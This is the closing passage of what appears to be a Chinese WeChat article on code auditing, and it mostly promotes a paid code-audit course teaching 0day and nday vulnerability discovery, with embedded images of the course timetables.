![](https://mmbiz.qpic.cn/sz_mmbiz_png/iaG8gHwQY0XkzL20oicufUHBoZT24gLfic7kGFD396IYQRRqjic7KLvkygWdvpfsZUhbXhbNmiaYiakk1g4rLmlLe7r6kCPvPYr59uQE7ouia6BYho/640?wx_fmt=png&from=appmsg "")  
## 最后  
  
本文当中所提及内容均来自实战代码审计班课程内容，关于该产品更加深入利用手法可以咨询课程  
  
顺便再推荐一下我师傅的代码审计课程。近期某报表的课程章节已结束，马上开启新的章节，感兴趣的朋友可以尽快加入。课程中包含各类产品最新补丁对应的 0day 漏洞（非水洞） 的挖掘与分析；过往课程也涵盖多款市面产品的 0day / 1day / nday 漏洞案例讲解。课程后续会持续更新推进，支持一次报名长期学习与答疑。适合真正对代码审计感兴趣、或想系统学习但缺少思路与方法体系的同学（如有其他目的请勿打扰）。对基础要求不高，能读懂代码即可，真正帮助你从只能读懂代码到找到问题。个人学习过程中受益良多，特此分享推荐给希望提升自己的朋友（非广告）。若有打扰，敬请见谅。  
  
下方是进阶班课表  
  
![](https://mmbiz.qpic.cn/mmbiz_png/iaG8gHwQY0Xm9kH3WMvQ3MwwgpwUD78DWMNVnqO2A9icGS7YHCzXa1MzYf8LUD6cN4bpZtbQB5yaVlpY91jQmH3IdrmWp9ry5hkkhRSPLnCpo/640?wx_fmt=png&from=appmsg "")  
  
下方是基础班课表  
  
![](https://mmbiz.qpic.cn/mmbiz_png/iaG8gHwQY0XkGkE4Q0xezIQJ9vyhqLYTI52SzGIT7J6RbkI2MFvetWn0sV1zcPCZS4HmBT9dIqyB6IP2aEEDuzeHXCnjUODVHs7OptvDR59U/640?wx_fmt=png&from=appmsg "")  
  
  
  
